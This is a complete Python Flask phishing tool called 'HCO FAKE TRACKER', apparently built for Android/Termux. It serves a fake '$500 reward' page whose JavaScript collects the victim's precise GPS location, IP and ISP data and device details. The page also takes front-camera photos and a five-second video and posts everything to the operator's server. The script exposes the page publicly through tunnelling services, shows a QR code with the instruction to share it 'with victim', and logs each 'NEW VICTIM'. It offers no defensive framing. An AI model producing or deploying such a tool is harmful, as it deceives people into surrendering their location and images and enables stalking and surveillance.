from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify, send_file
    import qrcode
    from PIL import Image, ImageDraw
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Use multiple gallery paths for better visibility
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera",  # Default camera folder
    "/sdcard/DCIM/HCO_Tracker",
    "/sdcard/Pictures/HCO_Tracker",
    "/sdcard/Download/HCO_Tracker"
]

# Create all directories
for path in GALLERY_PATHS:
    try:
        os.makedirs(path, exist_ok=True)
    except:
        pass

app = Flask(__name__)
_received_reports = []

# Global variable to store public URL
public_url = None

def show_tool_lock_screen():
    """Show the tool lock screen with countdown"""
    os.system('clear' if os.name == 'posix' else 'cls')

    # Display lock message
    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}🔄 Redirecting to YouTube...{Style.RESET_ALL}")
    
    # Countdown from 9 to 1
    print(f"\n{Fore.RED}{Style.BRIGHT}Countdown:{Style.RESET_ALL}")
    for i in range(9, 0, -1):
        print(f"{Fore.RED}{Style.BRIGHT}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    
    print(f"\n\n{Fore.GREEN}🎬 Opening YouTube Channel...{Style.RESET_ALL}")
    
    # Direct YouTube channel URL
    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
    
    # Try to open YouTube app
    try:
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_url], 
                      capture_output=True, timeout=5)
        print(f"{Fore.GREEN}✅ YouTube app opened!{Style.RESET_ALL}")
    except:
        try:
            subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
            print(f"{Fore.GREEN}✅ Opening YouTube...{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}{Style.BRIGHT}🚨 Press Enter AFTER subscribing & clicking bell icon...{Style.RESET_ALL}")
    
    # Show unlocked message
    print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
    time.sleep(2)

def check_ngrok_installation():
    """Check if ngrok is properly installed"""
    try:
        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ ngrok is installed: {result.stdout.strip()}{Style.RESET_ALL}")
            return True
    except:
        pass
    return False

def check_cloudflared_installation():
    """Check if cloudflared is properly installed"""
    try:
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared is installed: {result.stdout.strip()}{Style.RESET_ALL}")
            return True
    except:
        pass
    return False

def install_ngrok():
    """Install ngrok if not available"""
    if check_ngrok_installation():
        return True
    
    print(f"{Fore.YELLOW}📥 ngrok not found. Installing...{Style.RESET_ALL}")
    try:
        # Try multiple installation methods
        methods = [
            ['pkg', 'install', 'ngrok', '-y'],
            ['apt', 'install', 'ngrok', '-y'],
            ['pkg', 'update', '&&', 'pkg', 'install', 'ngrok', '-y']
        ]
        
        for method in methods:
            try:
                print(f"{Fore.CYAN}🔄 Trying: {' '.join(method)}{Style.RESET_ALL}")
                result = subprocess.run(method, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    if check_ngrok_installation():
                        print(f"{Fore.GREEN}✅ ngrok installed successfully{Style.RESET_ALL}")
                        return True
            except:
                continue
        
        print(f"{Fore.RED}❌ Failed to install ngrok via package manager{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Manual installation: Download from https://ngrok.com/download{Style.RESET_ALL}")
        return False
        
    except Exception as e:
        print(f"{Fore.RED}❌ Installation error: {e}{Style.RESET_ALL}")
        return False

def install_cloudflared():
    """Install cloudflared if not available"""
    if check_cloudflared_installation():
        return True
    
    print(f"{Fore.YELLOW}📥 cloudflared not found. Installing...{Style.RESET_ALL}")
    try:
        # Try multiple installation methods
        methods = [
            ['pkg', 'install', 'cloudflared', '-y'],
            ['apt', 'install', 'cloudflared', '-y'],
            ['pkg', 'update', '&&', 'pkg', 'install', 'cloudflared', '-y']
        ]
        
        for method in methods:
            try:
                print(f"{Fore.CYAN}🔄 Trying: {' '.join(method)}{Style.RESET_ALL}")
                result = subprocess.run(method, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    if check_cloudflared_installation():
                        print(f"{Fore.GREEN}✅ cloudflared installed successfully{Style.RESET_ALL}")
                        return True
            except:
                continue
        
        print(f"{Fore.RED}❌ Failed to install cloudflared via package manager{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Manual: Download from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/{Style.RESET_ALL}")
        return False
        
    except Exception as e:
        print(f"{Fore.RED}❌ Installation error: {e}{Style.RESET_ALL}")
        return False

def start_ngrok_tunnel():
    """Start ngrok tunnel with better error handling"""
    global public_url
    try:
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        
        # Kill any existing ngrok processes
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        time.sleep(3)
        
        # Start ngrok in background thread
        def run_ngrok():
            subprocess.run([
                'ngrok', 'http', str(PORT),
                '--log=stdout',
                '--region=us'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        ngrok_thread = threading.Thread(target=run_ngrok, daemon=True)
        ngrok_thread.start()
        
        print(f"{Fore.YELLOW}⏳ Waiting for ngrok to start (15 seconds)...{Style.RESET_ALL}")
        time.sleep(15)
        
        # Get ngrok URL
        max_retries = 8
        for attempt in range(max_retries):
            try:
                print(f"{Fore.CYAN}🔄 Attempt {attempt + 1}/{max_retries} to get ngrok URL...{Style.RESET_ALL}")
                response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
                if response.status_code == 200:
                    tunnels = response.json().get('tunnels', [])
                    for tunnel in tunnels:
                        if tunnel['proto'] == 'https':
                            public_url = tunnel['public_url']
                            print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
                            return public_url
                time.sleep(3)
            except:
                time.sleep(3)
        
        print(f"{Fore.RED}❌ Could not get ngrok URL{Style.RESET_ALL}")
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ Ngrok tunnel error: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare_tunnel():
    """Start Cloudflare tunnel"""
    global public_url
    try:
        print(f"{Fore.CYAN}🌐 Starting Cloudflare tunnel...{Style.RESET_ALL}")
        
        # Kill any existing cloudflared processes
        subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
        time.sleep(3)
        
        # Start cloudflared in background
        def run_cloudflared():
            subprocess.run([
                'cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        cloudflared_thread = threading.Thread(target=run_cloudflared, daemon=True)
        cloudflared_thread.start()
        
        print(f"{Fore.YELLOW}⏳ Cloudflare tunnel started in background{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Check: https://dash.cloudflare.com/ for tunnel URL{Style.RESET_ALL}")
        return "cloudflare_tunnel_active"
        
    except Exception as e:
        print(f"{Fore.RED}❌ Cloudflare tunnel error: {e}{Style.RESET_ALL}")
        return None

def start_localhost_run():
    """Alternative tunneling service"""
    global public_url
    try:
        print(f"{Fore.CYAN}🌐 Trying localhost.run...{Style.RESET_ALL}")
        
        result = subprocess.run([
            'ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:5000', 'nokey@localhost.run'
        ], capture_output=True, text=True, timeout=30)
        
        output = result.stdout + result.stderr
        print(f"{Fore.CYAN}📡 Output: {output}{Style.RESET_ALL}")
        
        import re
        urls = re.findall(r'https://[a-zA-Z0-9-]+\.localhost\.run', output)
        if urls:
            public_url = urls[0]
            print(f"{Fore.GREEN}✅ localhost.run URL: {public_url}{Style.RESET_ALL}")
            return public_url
        
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ localhost.run error: {e}{Style.RESET_ALL}")
        return None

def force_media_scan():
    """Force media scanner to refresh gallery"""
    try:
        for gallery_path in GALLERY_PATHS:
            try:
                subprocess.run([
                    'am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
                    '-d', f'file://{gallery_path}'
                ], capture_output=True, timeout=5)
            except:
                continue
        return True
    except:
        return False

def save_to_all_locations(file_data, filename, file_type="photo"):
    """Save file to all gallery locations"""
    saved_paths = []
    for gallery_path in GALLERY_PATHS:
        try:
            file_path = os.path.join(gallery_path, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            os.chmod(file_path, 0o644)
            saved_paths.append(file_path)
            print(f"{Fore.GREEN}✅ {file_type} saved to: {file_path}{Style.RESET_ALL}")
        except:
            continue
    
    if saved_paths:
        force_media_scan()
    return saved_paths

def display_banner():
    """Display the main banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Generate and display QR code"""
    try:
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        qr_matrix = qr.get_matrix()
        qr_text = ""
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code for URL:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 Direct Link: {url}{Style.RESET_ALL}")
        
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved as: {QR_PNG}{Style.RESET_ALL}")
        return True
    except:
        return False

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def test_url_accessibility(url):
    """Test if URL is accessible"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✅ URL is accessible from external networks!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}⚠️ URL returned status: {response.status_code}{Style.RESET_ALL}")
            return False
    except:
        print(f"{Fore.YELLOW}⚠️ URL test failed{Style.RESET_ALL}")
        return False

# COMPLETE HTML WITH WORKING JAVASCRIPT
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,215,0,0.8);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(255,255,255,0.2);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: gold;
        }
        .data-item { 
            margin: 10px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
        }
        #cameraPreview {
            width: 100%;
            max-width: 300px;
            border: 2px solid gold;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        #capturedImages {
            display: flex;
            gap: 10px;
            margin: 10px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .captured-image {
            width: 80px;
            height: 80px;
            border: 2px solid gold;
            border-radius: 10px;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won Exclusive Reward</div>
        
        <div class="reward">$500</div>
        <div>Cash Prize + Gift Card</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 PhonePe</div>
            <div class="feature">⚡ Fast Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Camera access required for verification
        </div>
        
        <button class="btn" id="claimBtn" onclick="startVerification()">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        <div id="capturedImages"></div>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>📊 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Processing...</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Processing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Processing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Processing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Processing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Processing...</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold;">
                ✅ Your reward will be processed within 24 hours
            </div>
        </div>
    </div>

    <script>
        const collectedData = {
            deviceInfo: {},
            location: null,
            photos: [],
            video: null,
            ip: null
        };

        async function startVerification() {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            const dataDiv = document.getElementById('data');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing...';
            status.className = 'status processing';
            status.innerHTML = '🔄 Starting verification...';
            status.style.display = 'block';

            try {
                // Step 1: Get device info
                status.innerHTML = '📱 Getting device information...';
                collectedData.deviceInfo = getDeviceInfo();
                updateDataDisplay();

                // Step 2: Get location
                status.innerHTML = '📍 Getting your location...';
                collectedData.location = await getLocation();
                updateDataDisplay();

                // Step 3: Get IP
                status.innerHTML = '🌐 Getting IP address...';
                collectedData.ipInfo = await getIPInfo();
                updateDataDisplay();

                // Step 4: Access camera and capture media
                status.innerHTML = '📸 Accessing camera for verification...';
                await accessCameraAndCapture();

                // Step 5: Send all data to server
                status.innerHTML = '📡 Sending data to server...';
                await sendAllData();

                // Success
                status.className = 'status success';
                status.innerHTML = '✅ Reward claimed successfully!';
                dataDiv.style.display = 'block';
                btn.style.display = 'none';

            } catch (error) {
                status.className = 'status error';
                status.innerHTML = '❌ Error: ' + error.message;
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
                
                // Still try to send whatever data we have
                await sendAllData();
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory,
                cores: navigator.hardwareConcurrency,
                touchPoints: navigator.maxTouchPoints
            };
        }

        function updateDataDisplay() {
            if (collectedData.deviceInfo) {
                document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
                document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
                document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 50) + '...' || 'Unknown';
                document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
            }
            if (collectedData.location) {
                if (collectedData.location.latitude) {
                    document.getElementById('loc').textContent = 
                        `Lat: ${collectedData.location.latitude}, Lon: ${collectedData.location.longitude}`;
                } else {
                    document.getElementById('loc').textContent = 'Location access denied';
                }
            }
            if (collectedData.ipInfo) {
                document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
            }
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        resolve({ error: error.message });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    org: data.org
                };
            } catch (error) {
                try {
                    const fallback = await fetch('https://api.ipify.org?format=json');
                    const data = await fallback.json();
                    return { ip: data.ip };
                } catch (e) {
                    return { error: 'Could not fetch IP' };
                }
            }
        }

        async function accessCameraAndCapture() {
            const video = document.getElementById('cameraPreview');
            const capturedImages = document.getElementById('capturedImages');
            
            try {
                // Access camera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 1280, height: 720 } 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                
                await video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Capture 3 photos
                capturedImages.innerHTML = '';
                for (let i = 0; i < 3; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    collectedData.photos.push(imageData);
                    
                    // Show thumbnail
                    const img = document.createElement('img');
                    img.src = imageData;
                    img.className = 'captured-image';
                    img.title = `Photo ${i + 1}`;
                    capturedImages.appendChild(img);
                    
                    // Wait between photos
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                
                // Record 5-second video
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => {
                        collectedData.video = reader.result;
                    };
                    reader.readAsDataURL(blob);
                };
                
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, 5000));
                recorder.stop();
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
            } catch (error) {
                throw new Error('Camera access denied: ' + error.message);
            }
        }

        async function sendAllData() {
            const payload = {
                ...collectedData,
                timestamp: new Date().toISOString(),
                mediaType: 'real_camera'
            };
            
            try {
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error('Server response not OK');
                }
                
                console.log('Data sent successfully');
            } catch (error) {
                console.error('Failed to send data:', error);
                // Try fallback method
                await sendFallbackData();
            }
        }

        async function sendFallbackData() {
            // Fallback: send via image request
            const dataStr = encodeURIComponent(JSON.stringify(collectedData));
            const img = new Image();
            img.src = `/fallback?data=${dataStr}`;
        }

        // Initialize device info on load
        collectedData.deviceInfo = getDeviceInfo();
        updateDataDisplay();
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\n{Fore.GREEN}🎯 NEW VICTIM ACCESSED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        
        # Extract data
        lat = data.get("location", {}).get("latitude")
        lon = data.get("location", {}).get("longitude")
        ip = data.get("ipInfo", {}).get("ip", "Unknown")
        city = data.get("ipInfo", {}).get("city", "Unknown")
        country = data.get("ipInfo", {}).get("country", "Unknown")
        isp = data.get("ipInfo", {}).get("org", "Unknown")
        photos = data.get("photos", [])
        video = data.get("video")
        device_info = data.get("deviceInfo", {})
        
        # Save photos
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                timestamp = int(time.time())
                filename = f"HCO_Photo_{timestamp}_{i+1}.jpg"
                
                saved_paths = save_to_all_locations(img_data, filename, "photo")
                if saved_paths:
                    photo_files.append(filename)
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Photo {i+1} save failed: {e}{Style.RESET_ALL}")
        
        # Save video
        video_file = None
        if video:
            try:
                if video.startswith('data:video'):
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                timestamp = int(time.time())
                filename = f"HCO_Video_{timestamp}.webm"
                
                saved_paths = save_to_all_locations(video_data, filename, "video")
                if saved_paths:
                    video_file = filename
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Video save failed: {e}{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'city': city,
            'country': country,
            'isp': isp,
            'latitude': lat,
            'longitude': lon,
            'photos': len(photos),
            'video': 'Yes' if video else 'No',
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        # Print results
        print(f"\n{Fore.GREEN}{'🎯 DATA CAPTURED SUCCESSFULLY ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📍 Location: {lat}, {lon}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.GREEN}📸 Photos: {len(photos)} real images captured{Style.RESET_ALL}")
        print(f"{Fore.GREEN}🎥 Video: {'5-second recording' if video else 'Not captured'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}❌ Report Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

@app.route("/fallback")
def fallback_data():
    """Fallback endpoint for data collection"""
    data_str = request.args.get('data')
    if data_str:
        try:
            data = json.loads(data_str)
            print(f"{Fore.YELLOW}📝 Fallback data received{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Data: {data}{Style.RESET_ALL}")
        except:
            pass
    return jsonify({"status": "logged"})

def main():
    global public_url
    
    # Show lock screen first
    show_tool_lock_screen()
    display_banner()
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended - Works Everywhere){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Cloudflare Tunnel (Alternative){Style.RESET_ALL}")
    print(f"{Fore.CYAN}3. localhost.run (Backup){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}4. Local Network Only (Same WiFi){Style.RESET_ALL}")
    print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-4): {Style.RESET_ALL}").strip()
    
    tunnel_service = "Local Network"
    
    if choice == '1':
        if install_ngrok():
            public_url = start_ngrok_tunnel()
            tunnel_service = "Ngrok"
    elif choice == '2':
        if install_cloudflared():
            public_url = start_cloudflare_tunnel()
            tunnel_service = "Cloudflare"
    elif choice == '3':
        public_url = start_localhost_run()
        tunnel_service = "localhost.run"
    
    # Determine final URL
    final_url = public_url if public_url and public_url != "cloudflare_tunnel_active" else local_url
    
    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔧 Service: {tunnel_service}{Style.RESET_ALL}")
    
    if public_url and public_url != "cloudflare_tunnel_active":
        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
        test_url_accessibility(final_url)
    else:
        print(f"{Fore.YELLOW}⚠️ Only works on same WiFi network{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}📁 Photos/Videos will save to:{Style.RESET_ALL}")
    for path in GALLERY_PATHS:
        print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
    
    display_qr_in_termux(final_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share the link/QR with victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
